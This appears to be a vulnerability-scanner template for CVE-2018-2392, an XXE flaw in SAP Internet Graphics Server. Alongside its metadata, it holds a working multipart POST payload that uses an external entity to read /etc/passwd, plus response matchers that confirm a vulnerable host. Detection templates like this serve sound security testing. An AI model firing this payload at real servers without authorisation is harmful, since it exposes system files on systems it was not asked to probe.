id: CVE-2018-2392
info:
  author: _generic_human_
  classification:
    cve-id: CVE-2018-2392
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cwe-id: CWE-611
  description: 'SAP Internet Graphics Servers (IGS) running versions 7.20, 7.20EXT,
    7.45, 7.49, or 7.53 has two XXE vulnerabilities within the XMLCHART page - CVE-2018-2392
    and CVE-2018-2393. These vulnerabilities occur due to a lack of appropriate validation
    on the Extension HTML tag when submitting a POST request to the XMLCHART page
    to generate a new chart.

    '
  name: SAP Internet Graphics Server (IGS) XML External Entity
  reference:
  - https://launchpad.support.sap.com/#/notes/2525222
  - https://blogs.sap.com/2018/02/13/sap-security-patch-day-february-2018/
  - https://www.rapid7.com/db/modules/auxiliary/admin/sap/sap_igs_xmlchart_xxe/
  - https://troopers.de/troopers18/agenda/3r38lr/
  - https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/sap/sap_igs_xmlchart_xxe.rb
  severity: high
  tags: cve,cve2018,sap,igs,xxe,xmlchart
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - Picture
    - Info
    - /output/
  - condition: or
    part: body
    type: word
    words:
    - ImageMap
    - Errors
  - status:
    - 200
    type: status
  - condition: and
    part: header
    type: word
    words:
    - text/html
    - SAP Internet Graphics Server
  matchers-condition: and
  raw:
  - "POST /XMLCHART HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data;\
    \ boundary={{randstr_1}}\n\n--{{randstr_1}}\nContent-Disposition: form-data; name=\"\
    {{randstr_2}}\"; filename=\"{{randstr_3}}.xml\"\nContent-Type: application/xml\n\
    \n<?xml version='1.0' encoding='UTF-8'?>\n    <ChartData>\n      <Categories>\n\
    \        <Category>ALttP</Category>\n      </Categories>\n      <Series label=\"\
    {{randstr_4}}\">\n        <Point>\n          <Value type=\"y\">12345</Value>\n\
    \        </Point>\n      </Series>\n    </ChartData>\n--{{randstr_1}}\nContent-Disposition:\
    \ form-data; name=\"{{randstr_5}}\"; filename=\"{{randstr_6}}.xml\"\nContent-Type:\
    \ application/xml\n\n<?xml version='1.0' encoding='UTF-8'?>\n    <!DOCTYPE Extension\
    \ [<!ENTITY xxe SYSTEM \"/etc/passwd\">]>\n    <SAPChartCustomizing version=\"\
    1.1\">\n      <Elements>\n        <ChartElements>\n          <Title>\n       \
    \     <Extension>&xxe;</Extension>\n          </Title>\n        </ChartElements>\n\
    \      </Elements>\n    </SAPChartCustomizing>\n--{{randstr_1}}--\n"
